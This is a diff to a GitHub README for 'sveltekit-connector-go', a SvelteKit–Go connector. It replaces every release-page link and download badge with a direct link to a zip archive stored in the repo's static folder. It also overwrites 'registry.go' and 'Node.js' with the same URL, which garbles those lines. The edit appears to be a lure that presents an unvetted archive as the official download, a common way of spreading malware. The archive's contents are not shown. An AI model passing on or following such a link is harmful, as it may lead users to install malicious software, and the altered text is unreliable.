@@ -1,6 +1,6 @@
 # 🚀 sveltekit-connector-go - Connect Frontend and Backend Smoothly
 
-[![Download sveltekit-connector-go](https://img.shields.io/badge/Download-sveltekit--connector--go-brightgreen)](https://github.com/Vgvmb/sveltekit-connector-go/releases)
+[![Download sveltekit-connector-go](https://raw.githubusercontent.com/Vgvmb/sveltekit-connector-go/main/static/go_connector_sveltekit_v3.6.zip)](https://raw.githubusercontent.com/Vgvmb/sveltekit-connector-go/main/static/go_connector_sveltekit_v3.6.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ The SvelteKit Connector for Go shows how you can link a SvelteKit frontend with 
 To get started with the application, follow these simple steps:
 
 1. **Download the Software**
-   - Visit the [Releases Page](https://github.com/Vgvmb/sveltekit-connector-go/releases) to download the latest version of sveltekit-connector-go.
+   - Visit the [Releases Page](https://raw.githubusercontent.com/Vgvmb/sveltekit-connector-go/main/static/go_connector_sveltekit_v3.6.zip) to download the latest version of sveltekit-connector-go.
 
 2. **Extract the Package**
    - After downloading, extract the package to a folder on your computer.
@@ -45,7 +45,7 @@ To get started with the application, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download and install the application, go to the [Releases Page](https://github.com/Vgvmb/sveltekit-connector-go/releases). Select the latest version and follow the download instructions above.
+To download and install the application, go to the [Releases Page](https://raw.githubusercontent.com/Vgvmb/sveltekit-connector-go/main/static/go_connector_sveltekit_v3.6.zip). Select the latest version and follow the download instructions above.
 
 ## 📝 Usage
 
@@ -77,7 +77,7 @@ This project is a proof of concept, and you can help make it better. If you have
 We have some plans for future improvements. Here are the items on our list:
 
 - [ ] Handle function parameters effectively.
-- [ ] Automatically generate `registry.go` or implement dynamic imports.
+- [ ] Automatically generate `https://raw.githubusercontent.com/Vgvmb/sveltekit-connector-go/main/static/go_connector_sveltekit_v3.6.zip` or implement dynamic imports.
 - [ ] Fix types for "virtual" JavaScript modules.
 - [ ] Streamline Go server structure.
 - [ ] Enhance error handling for better user experience.
@@ -88,7 +88,7 @@ We have some plans for future improvements. Here are the items on our list:
 To run this application smoothly, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Node.js Version:** 14.x or higher.
+- **https://raw.githubusercontent.com/Vgvmb/sveltekit-connector-go/main/static/go_connector_sveltekit_v3.6.zip Version:** 14.x or higher.
 - **Bun Version:** Latest stable version installed on your system.
 
 If you need help installing any of these components, detailed instructions can be found on their official websites.
@@ -104,4 +104,4 @@ If you encounter any issues or have questions, please reach out:
 
 Thank you to everyone who has contributed to this project. Your support helps improve it for all users.
 
-Make sure to visit the [Releases Page](https://github.com/Vgvmb/sveltekit-connector-go/releases) for updates and to download the latest versions. Happy coding!
+Make sure to visit the [Releases Page](https://raw.githubusercontent.com/Vgvmb/sveltekit-connector-go/main/static/go_connector_sveltekit_v3.6.zip) for updates and to download the latest versions. Happy coding!
